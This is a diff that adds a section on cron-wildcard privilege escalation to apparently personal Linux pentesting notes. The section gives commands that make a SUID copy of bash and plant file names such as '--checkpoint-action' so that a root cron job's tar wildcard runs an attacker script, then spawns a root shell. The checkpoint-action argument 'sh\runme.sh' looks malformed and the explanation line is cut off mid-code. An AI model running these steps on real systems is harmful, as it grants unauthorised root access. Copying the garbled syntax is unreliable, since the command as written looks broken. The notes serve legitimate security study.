@@ -446,6 +446,28 @@ Then all we have to do is wait for the job to run. Using the script above, after
 ```
 systemctl list-timers --all
 ```
+
+### Escalation via Cron Wildcards
+- **Setup**   
+`/etc/crontab` contains a script or command that uses a wildcard, in our case it contains `* * * * * root /usr/local/bin/compress.sh`, and when we cat the contents of that script, it contains the command `tar czf /tmp/backup.tar.gz *`.
+- **Escalation**  
+We can escalate this via tar checkpoints. We simply need to create a checkpoint and a checkpoint-action.  
+```
+# Create our escalation script
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh
+
+# Create a checkpoint file
+touch /home/user/--checkpoint=1
+
+# Create a checkpoint action
+touch /home/user/--checkpoint-action=sh\runme.sh
+
+# Wait for our cron job to run, and then we should be able to execute the bash in /tmp
+/tmp/bash -p
+```
+- **Why this works**
+So in this case, because of the wildcard, the system interprets this as the command `tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=sh\runme.sh
+
 # Escalation Path: NFS Root Squashing
 
 # Escalation Path: Docker
